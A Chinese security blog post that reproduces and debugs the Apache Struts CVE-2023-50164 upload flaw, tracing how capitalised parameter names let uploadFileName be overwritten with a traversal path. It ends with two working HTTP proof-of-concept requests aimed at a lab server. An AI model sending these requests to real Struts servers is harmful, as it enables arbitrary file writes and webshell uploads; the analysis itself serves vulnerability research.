<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0n-pNnuNY6FJ5_ebxUZXxA)

**声明：**该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关

  

  

      现在只对常读和星标的公众号才展示大图推送，建议大家把**猫蛋儿安全** “设为**星标**”，否则可能看不到了！

  

![](https://mmbiz.qpic.cn/mmbiz_png/9WIOnKicjz2XHeRTuyJl4XUVNEAKJ7guicOZWqC9UQ6BltkqkyteD6dP3H0TU8AvTgVa94Z5vaDZcLrnnbDxewsQ/640?wx_fmt=png)

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/XRjU6tgmMe7WsHWeE9qRfBN0Y8gOzW1xFJkNe4cTlCEdHzgdicW4JnVe9MqKfYeibEPKdtRMibNoFHZ9ME2zsgDdQ/640?wx_fmt=png)

漏洞简介

      Apache Struts 是一个开源的、用于构建企业级 Java Web 应用的 MVC 框架。2023 年 12 月，官方披露 CVE-2023-50164 Apache Struts 文件上传漏洞。

      攻击者可以通过污染相关上传参数导致目录穿越，若在具体代码环境中允许上传危险后缀文件（例如 jsp 文件），则攻击者可能结合该目录穿越漏洞上传 webshell 至可解析目录，执行任意代码。

      前两天后台就有同学经常询问这个漏洞，该漏洞团队前两天就已经收录但是感觉利用限制多，网上很多师傅已经说过这个漏洞的原理了，今天正好有时间就跟一遍这个漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/9WIOnKicjz2XHeRTuyJl4XUVNEAKJ7guicOZWqC9UQ6BltkqkyteD6dP3H0TU8AvTgVa94Z5vaDZcLrnnbDxewsQ/640?wx_fmt=png)

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/XRjU6tgmMe7WsHWeE9qRfBN0Y8gOzW1xFJkNe4cTlCEdHzgdicW4JnVe9MqKfYeibEPKdtRMibNoFHZ9ME2zsgDdQ/640?wx_fmt=png)

复现过程

      网上其他师傅的分析看了一遍是通过大小写进行变量覆盖，随后利用这种修改变量的方式在特定的条件下达到文件上传的效果。我们可以简单复现一下，首先搭建一个文件上传的环境。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzyzWia9vUdKSicG2Np35zzVwjItJLjKIadcAMlOfCQiarNSLjqvibkWl5dw/640?wx_fmt=png&from=appmsg)

      对应上传文件的逻辑代码如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzPibHoFmgEIekFcoICLum5Z3UkIZB8flJcYIAzgibeMswwEjJLrQ7tMeQ/640?wx_fmt=png&from=appmsg)

      访问构造好的上传页面，开始进行测试。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzs3zPjI9soYOq6rR6R3RxvjdNVNVjmbVqbU5WcqXZMr1NHKhzCoB3WQ/640?wx_fmt=png&from=appmsg)

      抓包上传文件，开始进行测试，首先我们先正常上传一个文件，可以看到上传成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzWQQR7ibNwyKNFADhUbHdiasSfsA20GUQjcrudUJnjGGFGdveiaCQTxD1w/640?wx_fmt=png&from=appmsg)

      接下来我们开始尝试通过修改 filename 跨路径测试一下，结果上传失败。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzCBepRKE9g5VkaR80hZhzEBFT8IXtlOKaIvC1OMw600XRHedtNw8UKg/640?wx_fmt=png&from=appmsg)

      通过已经分析了的文章我们可以得知，该漏洞是由于大小写敏感导致变量覆盖从而触发目录穿越上传文件，所以我们先成功复现一遍漏洞然后在开始进行代码分析。这里我们通过五种测试，然后将出现的问题逐个分析。

（1）通过修改 Upload 和 upload 进行上传文件。可以看到 upload 成功覆盖了 Upload。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzoggAFcnGYibzQqIA6xLRojMgxdRsW5ySdicolUTLgjmnjcAhqAkSkz9w/640?wx_fmt=png&from=appmsg)

（2）通过修改 upload 的 filename 进行目录穿越。可以看到并没有成功穿越。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzx7V244kGoRO655JOEB1bLyQricuRXMHHgl68CE3CEvZNicQugtRaqMcw/640?wx_fmt=png&from=appmsg)

（3）通过利用 upload 和 uploadFileName 两个参数进行上传，结果无法跨越只能上传 upload。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzf5OVbkdjUsFsrbVkzszXU8sehicuJoykmPaL1WQroJHPv55LM7iaQgqA/640?wx_fmt=png&from=appmsg)

（4）通过利用 Upload 和 uploadFileName 两个参数进行上传，结果成功跨越，漏洞复现成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAz91BWicFXgp1U5icEueRlk2muwHjXibfCmfDUA0M7uznC71cKicIibBntaibw/640?wx_fmt=png&from=appmsg)

 **复现结论：漏洞通过首字母大小写切换可以进行变量覆盖，通过覆盖 filename 中的 uploadFileName 变量从而进行路径穿越，最终达到跨目录上传的效果。**

 **例如上面成功复现的包一样，Upload 首字母大写，uploadFileName 小写。最后覆盖掉 Upload 中的 uploadFileName 从而成功跨目录上传文件。**

![](https://mmbiz.qpic.cn/mmbiz_png/9WIOnKicjz2XHeRTuyJl4XUVNEAKJ7guicOZWqC9UQ6BltkqkyteD6dP3H0TU8AvTgVa94Z5vaDZcLrnnbDxewsQ/640?wx_fmt=png)

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/XRjU6tgmMe7WsHWeE9qRfBN0Y8gOzW1xFJkNe4cTlCEdHzgdicW4JnVe9MqKfYeibEPKdtRMibNoFHZ9ME2zsgDdQ/640?wx_fmt=png)

代码分析

      通过我们上面的复现漏洞的实验可以梳理处理几个问题。

```
（1）为什么filename参数不可以直接进行穿越？
（2）为什么upload可以覆盖Upload？
（3）为什么通过uploadFileName覆盖变量后就可以进行目录穿越？

```

      首先我们知道 struts2 本身就存在一套过滤链进行处理的，所以我们分析一下 s2 对应上传的过滤，这里我们通过 debug 定位到了 FileUploadInterceptor。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAznzekv1CY5kn3de3CoHuhqddicZUsdRAV0QfEf9Kdx6Oic7viaAeMqFCRg/640?wx_fmt=png&from=appmsg)

      我们知道 struts2 的过滤是配置在 struts-default.xml 中的，直接去找一下那个位置的类去看一看。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzg9g3iaMoicBOicka0SFqWxpaazz6Gic4uU0XwPVaUicxxVlkwAPKRoSTbHA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzDicXXcUWoaC2wicpibqV4gjicdlJ4ia0nrKPIGxvKwFZXDeseaviaibOToPrQ/640?wx_fmt=png&from=appmsg)

      接下来我们就开始对其进行分析，过滤链走到了 intercept 方法，向下进行调试，最后在标记的位置分别获取请求包中的表单、表单名、文件类型、文件名等。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzqOwJwsdPbDZ53ice1lia5KneDsdicl5oMlhL8icpsq3QG6sEg6whebbdeQ/640?wx_fmt=png&from=appmsg)

      首先我们先来看一下他的文件名是怎么进行获取的，我们跟进 getFileNames 方法，最后跳到 JakartaMultiPartRequest. 类中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzfWgLibPstnzBkZy4GXwHAFRibFvjjKYsXj4W85LVqbKqZzbCfyR04nicQ/640?wx_fmt=png&from=appmsg)

      我们可以看到这个文件名进行了 getCanonicalName 方法，跟进查看一下。这里直接直接过滤了 “/“”\“这种跨目录，所以我们想直接修改 filename 参数无法进行穿越，也就解决了问题一 - 为什么 filename 参数不可以直接进行穿越？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzmW81X7dc50SiayVlgXSqicicdFlUJIgaiaVs9qmk0ZJHZQtUXYm2M6dPDg/640?wx_fmt=png&from=appmsg)

      返回到 FileUploadInterceptor，继续向下跟进，可以看到所有的文件信息都存储到了 acceptFile 中，然后会将这里的 Upload、UploadContentType、UploadFileName 都放到这个 newParams 中。接下来我们看一下 ac.getParameters().appendAll(newParams) 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzcWLWIXb0VHrRrgkmiba0xML30FbE1E4F8cicicRIiaKd7YcPMoUxG73CIg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzQ8Ia7XN0UBibJKDeqy4yficicbv6O5gRRazqJQib7sfOYqy3FYIG07G09Q/640?wx_fmt=png&from=appmsg)

      这里的 ac 是我们上下文的 Context，而 ac.getParameters() 获取到的则是 org.apache.struts2.ActionContext.parameters，一个 HttpParameters 类，这里将上传文件的信息都放在了 HttpParameters 中，所以我们跳到 HttpParameters.appendAll 方法，继续向下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzgmibaRYFDyvmmVSkO4w7Kcufo5q2FbbvzP3OZGvrVB9XOxKaN6Y9hKw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzjxRm0NibHOHVaUG9vPS8aUePFSoictFWBeN8H27tbKChkmq6aiaefzugg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzDrGdmPiaAm4mvibicaNZ39dBjQEmqLsnDENLFxic2cMZWzNC1yfq0FmqHg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzwCGGH2s3guQFfzXP5OoaHAdNG5pfGuiaTObcZbYibWJsZfLt2Sx4IT6A/640?wx_fmt=png&from=appmsg)

      跳到 HttpParameters. appendAll 方法，将 newParams 赋给 this.parameters，然后返回 this，这里的 this.parameters 是 HashMap。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAz9hLPsaop62yeIDCEAcUmqeWOgYLScQxTPWrMxUneVrbpnyHPYic6sog/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzX9yOo5KfTlYdxyXZRWRtcf9HcicMzmkY0lxVHSY0pb2K9DbewgFWzng/640?wx_fmt=png&from=appmsg)

      到这里我们知道 FileUploadInterceptor 中获取的参数都存储在 HttpParameters 类型的对象中了，上传文件参数都在 HttpParameters.parameters 里面。分析到这里我们并没有发现存在变量覆盖，所以变量覆盖的操作可能在 FileUploadInterceptor 之后，所以我们开始查看实际的 Action 执行的位置。

      刚才说到 FileUploadInterceptor 将获取的参数都存储在 HttpParameters 类型的对象中，也就是上面提到的 upload、uploadContentType 和 uploadFileName，而开发者就是通过在 Action 中定义相关的 setter 方法获取这些参数的内容的。

      所以在 setter 位置进行断点调试，发送一个正常上传业务的请求包。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzQ0DsGtjYrtuzMRTXYC0774bwvnYBiahmpqkn8opeBp4TiaH9JeaHUVtA/640?wx_fmt=png&from=appmsg)

      通过栈内容发现是通过反射调用，并且在栈中发现使用了 ParametersInterceptor 过滤器，而如果 package 使用了 ParameterIntercepter 这个拦截器，OgnlValueStack 会自动为 Action 中有 set 方法的属性赋值（如果用了 modeldriven，同样也会为实体中有 set 方法的属性赋值），赋值时，OGNL 会将此时值栈中的 action 当做当前节点（默认情况下在请求进入 action 之前，该 action 也会被放入值栈），然后访问它的成员属性的 set 方法。而在这里我们发现 ParametersInterceptor.setParameters 方法在进行参数绑定的过程中对 HttpParameters parameters 进行了一系列操作，我们跟进查看一下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzUEjX1ib3AnbrW44zMHibs6icYqIiaLLiadF3DST3VGukhFRZwssWeUZAB1A/640?wx_fmt=png&from=appmsg)

      跟进 ParametersInterceptor.setParameters 我们发现首先会创建一个 HttpParameters，接下来将 parentParams 赋值到新声明的 HttpParameters 中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzmWv2tntmyHcO8ZTpbS9ZYYXjwKyT5BUqia9ibpUR3wrSwVvhbD1HZSHA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzxpohVYFxxjSv6mYX9dyb7RjpLAicuR8SnuRMwLom3f6ozMtwfk7cWnw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzCrUznSfibnDOa93dcicWcVZWzQYFkdX1BEHFyEbaKzJ1VYU3hpp7d6Yg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzKXq3z1HBvCJR2tYvOssfL4TE4ZTMrZibqMkE5XkXnWZIFgMmqdDPG9A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzQ8v9PBOJdDUedZ55l1YVu1IFJfKhKuUZPUfnkU30C10zPtoPDHfFFw/640?wx_fmt=png&from=appmsg)

      接下来声明一个 TreeMap。利用 params 制作一个迭代器 var6，开始进行循环赋值。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAz9vyBbiahBNXPuiaa76iaibBRsuiaf9Or9W7xVmTmI5bG5qI9XxHuaticOorQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzRZPFIM4SmDcatzTXS6DU7NXDGM4kbTwg2bk9KyWEqDIuia0y8ejfbBA/640?wx_fmt=png&from=appmsg)

      继续向下跟进，这里将会对 var20 存储的数据按照存储结构进行对应的 set 方法调用，所以我们依旧继续向下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzzZ0kROdHZvMKq7ZP4K24xqU9lI8L6oWN4kfMUaNFvJFB1XfuLpJ8ibA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzHraez3ozp86dDvTnWjicCHvxrLjibiaNZBeAGhBj0y27eVnyqmknp3HKQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzmsXrpsj4VbLGeTNhzDSYc3DgYv5NiaAwiaIVu2jbdtXtLVtQgArXUWyQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAziazgqWmI6iavbFmF3h6HZIc9Px81zPciaKZCd9nQbTYbiaIicic7ibhZ9qasA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAziayMGClicGn5hn5LB0j1d7lyHoBAPejHgH1DRNELbKBdaILyyXeWSaicA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzCMIqia9xQN4EFDooX4zpLhEiavs3Fw8y1YV3UVR8MoYSibeDwibVZCiaRtA/640?wx_fmt=png&from=appmsg)

      节省时间不继续向下了，直接给出栈了，有兴趣的自己跟一下吧。

```
setUpload:24, UploadAction (com.struts2)
invoke:-1, GeneratedMethodAccessor24 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 1385670583 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$57)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzk9CMyIqnOxLswoEdcNjjcE1qia0kiapibvWC51P9kEaoUVOc9RGxFIfsA/640?wx_fmt=png&from=appmsg)

      最终触发 setUpload 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzewRkqr1bVZ5mzUV3HhKWDzwfPI5zdhFVWcD8nKVCtF38XHz18dDskQ/640?wx_fmt=png&from=appmsg)

      从 acceptableParameters 的赋值以及 set 方法的调用中，变量覆盖也就在此过程中触发了。

      首先在 HttpParameters.parameters 中，数据类型为 HashMap。HashMap 的存储顺序是 “小写开头在前，大写开头在后 “。

      而在 acceptableParameters 中，数据类型为 TreeMap。TreeMap 的存储顺序是 “大写开头优先 “。

      而我们在 FileUploadInterceptor 获取到的 HttpParameters 是 HashMap，而在 ParametersInterceptor 中 acceptableParameters 获取到的 HttpParameters 是 TreeMap，本身大写开头在后，现在变成了大写开头优先，也就导致了变量覆盖。

      这里我们将 Upload 和 upload 同时进行请求进行调试一下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAziauahoCK2CxJGOsw0EGibZCbbXESIbd07YBfn0TtQlfItictn9gHzgBCQ/640?wx_fmt=png&from=appmsg)

      可以看到 TreeMap 的存储顺序是大写开头在前，小写开头在后，所以 upload 在后执行，也就覆盖了 Upload 的上传内容。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzZ9CjXE7mNESn27yk67dib7RhHWRqqv6tnHSRuiaoia7CRuibxC0El7GfBA/640?wx_fmt=png&from=appmsg)

      最后的上传结果如下图所示，这也就解释了问题二 - 为什么 upload 可以覆盖 Upload？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAz6pV0VP6icX1VJ89BjBYK28FEdGbBXiaEVOm1SYTfsibYcFYsH4JoEeMoA/640?wx_fmt=png&from=appmsg)

      最后的问题三 - 为什么通过 uploadFileName 覆盖变量后就可以进行目录穿越？首先我们知道 FileUploadInterceptor 过滤链的 JakartaMultiPartRequest.getCanonicalName 会对传入的 uploadFileName 进行过滤。

      但是如果我们将 uploadFileName 设置为一个非文件参数，这样参数内容也不会经过 FileUploadInterceptor 过滤链了，也就更不会经过 JakartaMultiPartRequest.getCanonicalName 进行过滤了。再通过 uploadFileName 的首字母小写优先级小于 Upload 的优先级，也就出现了变量覆盖，所以现在公开的 poc 才是如下两种。

漏洞 POC-1

```
POST /struts2_066_war_exploded/upload.action HTTP/1.1
Host: 172.20.10.4:8082
Content-Length: 293
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.20.10.4:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhraU57lkZHpBtit
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.20.10.4:8082/struts2_066_war_exploded/upload.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=1D049D6F711E436B2B0A9DE3139613D9
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
------WebKitFormBoundaryrhraU57lkZHpBtit
Content-Disposition: form-data; 
Content-Type: text/plain
123
------WebKitFormBoundaryrhraU57lkZHpBtit
Content-Disposition: form-data; 
../123.txt
------WebKitFormBoundaryrhraU57lkZHpBtit—

```

漏洞 POC-2

```
POST /struts2_066_war_exploded/upload.action?uploadFileName=../123.txt HTTP/1.1
Host: 172.20.10.4:8082
Content-Length: 182
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.20.10.4:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhraU57lkZHpBtit
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.20.10.4:8082/struts2_066_war_exploded/upload.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=1D049D6F711E436B2B0A9DE3139613D9
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
------WebKitFormBoundaryrhraU57lkZHpBtit
Content-Disposition: form-data; 
Content-Type: text/plain
123
------WebKitFormBoundaryrhraU57lkZHpBtit--

```

      最后的最后，我们看一下利用 POC 的请求包再 TreeMap 的顺序和最终上传结果吧~~~

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzT9CdjibtSZFOwnUFal6zLjgSq07hsxOP0zzO1QalTQI0D0VS1Fjib3pQ/640?wx_fmt=png&from=appmsg)

      成功跨文件上传。

      PS：最后说一嘴实战利用吧，这个漏洞得针对于各个系统来利用，没法像前面的那些表达式注入哐哐 RCE，算是个漏洞利用的知识点吧。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w1MLruJQd2FJzSwF5ib4VRqC4cCibBPLAzia1hgKQicM52r5cIGicNzfhSKC6ibYMwBSv1aibqdsecnK5LdiagKJGqIE3w/640?wx_fmt=png&from=appmsg)

参考文章：

```
https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93
https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/

```
